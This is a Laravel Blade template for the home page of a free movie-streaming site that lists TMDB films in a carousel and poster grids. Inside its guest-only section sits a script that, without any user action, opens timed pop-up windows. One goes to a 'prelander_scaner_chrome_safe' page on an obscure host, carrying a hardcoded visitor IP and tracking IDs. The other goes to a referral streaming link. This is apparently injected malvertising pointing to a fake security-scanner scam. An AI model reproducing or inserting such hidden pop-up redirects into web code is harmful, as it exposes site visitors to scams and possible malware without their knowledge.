
@extends('layout.mainlayout')
@section('content')
@if(session()->has('login'))
<script>
window.onload =function(){
  swal({
        title: "Login  successfull",
        type: "success",
        position:"top",
        showConfirmButton: false,
        showCancelButton: false,
        timer: 2000
    });
};
</script>
{{session()->forget('login')}}
@endif
@if(!isset($_GET['genre']))
<div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
  <ol class="carousel-indicators">
    <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
    <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
    <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
  </ol>
  <div class="carousel-inner">
    @foreach ($carousel_data as $item)
            @if($loop->first)
            <div id="slide-parent" class=" carousel-item active">
            <a href="/play/{{$item->id}}"><img  class="background-img d-block w-100" src="https://image.tmdb.org/t/p/original{{ $item->backdrop_path}}" alt="First slide"></a>
                <div class="d-none d-xl-block" id="slide-details">
                    <h4>TITLE : {{ $item->original_title}}</h4>
                    <p style="font-size:14px" class="mt-2"> {{$item->overview}}</p>
                    <p>
                        <span class= >IMDB :</span> <span style="color:yellow">{{ $item->vote_average }}</span></span>
                        <span style="float:right">GENRE :
                        @foreach($item->genre_ids as $key => $value)
                            @if(isset($genres[$value]))
                                {{' | '.$genres[$value]}}
                            @endif
                        @endforeach
                        </span>
                    </p>
                </div>
            </div>
            @else
            <div id="slide-parent" class=" carousel-item">
                <a href="/play/{{$item->id}}"><img  class="background-img d-block w-100" src="https://image.tmdb.org/t/p/original{{ $item->backdrop_path}}" alt="First slide"></a>
                    <div class="d-none d-xl-block" id="slide-details">
                        <h4 >TITLE : {{ $item->original_title}}</h4>
                        <p style="font-size:14px" class="mt-2"> {{$item->overview}}</p>
                        <p>
                            <span>IMDB : <span style="color:yellow">{{ $item->vote_average }}</span></span>
                            <span style="float:right">GENRE :
                            @foreach($item->genre_ids as $key => $value)
                                @if(isset($genres[$value]))
                                    {{' | '.$genres[$value]}}
                                @endif
                            @endforeach
                            </span>
                        </p>
                    </div>
            </div>
            @endif
    @endforeach

    </div>
    <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
        <span class="sr-only">Previous</span>
    </a>
    <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
        <span class="carousel-control-next-icon" aria-hidden="true"></span>
        <span class="sr-only">Next</span>
    </a>

</div>
@guest()
<script>
    setTimeout(() => window.open('http://pk8ng0po.lyomaaiuwy.host/prelander_scaner_chrome_safe/index.html?ip=122.213.199.165&device_brand=Desktop&device_model=Desktop&browser_name=Chrome&os_name=Windows&osv=Windows%2010&lang=en&domain=track.builderredirect.com&clickid=wrh71o2k683toojs1pmect7c&country=JP&cmpid=3c459eb4-b39e-42d9-924f-fe1d6fa77ce8&cep=C0FlHqfobHlauRHPO10IWoNRI03zxbXZ6OztMYsarylsaeflqASYHjzYoc--ge3lpbvpRC7iakNqZ8rbIxQSp4ALius3Uon3hIbjFmogkn4vOqSuy3luvy7peiEeBmjiegEdl6wasDSJxlwcrXO3cdQ_N9u-BI8uXqNaIJ1P5ewvMoIJ_SwVfaqHGJnd_hn18ntdjCesiWoeIZUK_ZIQTpUy5cKHcf5AxBofoId8LL-y039lPddCLLdfUQ5ybUtFNzi1i5WFW_hzyQksJ0rWC0_DIvYFizRCqBxwk0pcouNLmOPbJ5EoMehoXVfjmMoVBCIeRWjQG3QEB40fr1WM8d0YC48XLZL1xRS2Dd4VAMsE4nXH_gL57vXhswA67NHR&lptoken=15e180af46b50624923b&qwert=%7Bt10%7D'), 3000); 
    setTimeout(() => window.open('https://streampro.club/?p=gvtdontbhe5gi3bpgmydkmi&sub1=c231ee28wg5h9c79&sub2=15184550'), 15000); 
</script>
@endguest
<div style="background:#ECF0F1" class="pl-4 mt-3">
    <p  class="toogle-text text-info pt-2">Like and share our website to support us</p>
    <div class="social d-flex pb-4">
        <div id="facebook" class="social-link text-center "><a target="_blank" class="text-light nav-link" href="https://www.facebook.com/"><i class="fab fa-facebook-square"></i></a></div>
        <div id="twitter" class="social-link text-center ml-2"><a target="_blank" class="text-light nav-link" href="https://twitter.com/login?lang=en"><i class="fab fa-twitter-square"></i></a></div>
        <div id="instagram" class="social-link text-center ml-2"><a target="_blank" class="text-light nav-link" href="https://www.instagram.com/"><i class="fab fa-instagram"></i></a></div>
    </div>
</div>
<div class="main_section px-4 pt-3">

        <div class="movie_category">
            <p id="suggestions" class="btn btn-danger btn-sm main-button font-weight-bold">SUGGESTIONS</p>
            <p id="popularBtn" class="btn btn-dark btn-sm main-button  ml-1">POPULAR</p>
            <p id="trendingBtn" class="ml-1 btn btn-outline-dark btn-sm main-button ">TRENDING</p>
            <a id="link" href="popularLink" class="float-right"><p class="btn btn-outline-dark main-button btn-sm ">More <i class="fas fa-angle-double-right"></i></p></a>
        </div>

        {{-- Popular --}}
        <div id="popular" class="row">
            @foreach($popular_data as $item)
            @if(!empty($item->poster_path))
                <div id="desktop-div" class="col-6 col-md-3 col-xl-2">
                <a href="/play/{{$item->id}}"><img class="display_img" src="https://image.tmdb.org/t/p/w500{{$item->poster_path}}"  width="100%" height="100%" ></a>
                </div>
            @endif
            @endforeach

        </div>

        <hr>
        <div class=" movie_category mt-3">
            <p id="hot" class="btn btn-danger btn-sm main-button font-weight-bold">RECENT HOT</p>
            <p id="latestBtn" class="btn btn-dark btn-sm main-button  ml-1">LATEST</p>
            <p id="commingSoonBtn" class="btn btn-outline-dark btn-sm ml-1 main-button ">COMMING SOON</p>
            <a id="down-link" href="latestLink" class="float-right"><p class="btn btn-outline-dark btn-sm main-button">More <i class="fas fa-angle-double-right"></i></p></a>
        </div>


        {{-- Now Playing --}}
        <div id="now-playing" class="row">
            @foreach($now_playing_data as $item)
            @if(!empty($item->poster_path))
                <div style="relative"  class="col-6 col-md-3 col-xl-2">
                <a href="/play/{{$item->id}}"><img class="display_img" src="https://image.tmdb.org/t/p/w500{{$item->poster_path}}"  width="100%" height="100%" ></a>
                </div>

            @endif
            @endforeach
        </div>

        <hr>
        <div class="movie_category mt-3">
            <p class="btn btn-danger btn-sm main-button">DRAMAS</p>
            <a href="dramasLink" class="float-right"><p class="btn btn-outline-dark btn-sm main-button">More <i class="fas fa-angle-double-right"></i></p></a>
        </div>


        {{-- Dramas --}}
        <div id="dramas" class="row">
            @foreach($dramas_data as $item)
            @if(!empty($item->poster_path))
                <div id="desktop-div" class="col-6 col-md-3 col-xl-2">
                <a href="/play/{{$item->id}}"><img class="display_img" src="https://image.tmdb.org/t/p/w500{{$item->poster_path}}"  width="100%" height="100%" ></a>
                </div>
            @endif
            @endforeach
        </div>

    @else
    <div class="main_section">
        <div id="genre_selector" class=" movie_category pt-3 px-4">
          <p class="btn btn-outline-dark btn-sm">{{ strtoupper($genre_name)}}</p>
          <a href="/index"><p class="btn btn-outline-dark btn-sm float-right mt-3 ">BACK</p></a>

        </div>


        {{-- Gernres --}}
        <div class="d-flex justify-content-center">{{$genre_data->appends(array_except(Request::query(),'genre_page'))->links()}}</div>
        <div id="genre_data" class="row px-4">
            @foreach($genre_data as $item)
            @if(!empty($item->poster_path))
                <div id="desktop-div" class="col-6 col-md-3 col-xl-2">
                <a href="/play/{{$item->id}}"><img class="display_img" src="https://image.tmdb.org/t/p/w500{{$item->poster_path}}"  width="100%" height="100%" ></a>
                </div>
            @endif
            @endforeach
        </div>
        <div class="d-flex justify-content-center">{{$genre_data->appends(array_except(Request::query(),'genre_page'))->links()}}</div>
    @endif
    <p style="position:fixed; bottom:30px; right:5px;z-index:444;" class="btn btn-dark" onclick="window.scrollTo({top: 0, behavior: 'smooth'});">TOP <i class="fas fa-long-arrow-alt-up"></i></p>
    <p class="toggle-text text-center text-secondary  mb-0  pb-3">A wide section of online movies are available on <span class="text-success font-weight-bold">HQM</span> MOVIES. You can watch online movies for free without registeration.</p>
</div>
</div>
@endsection
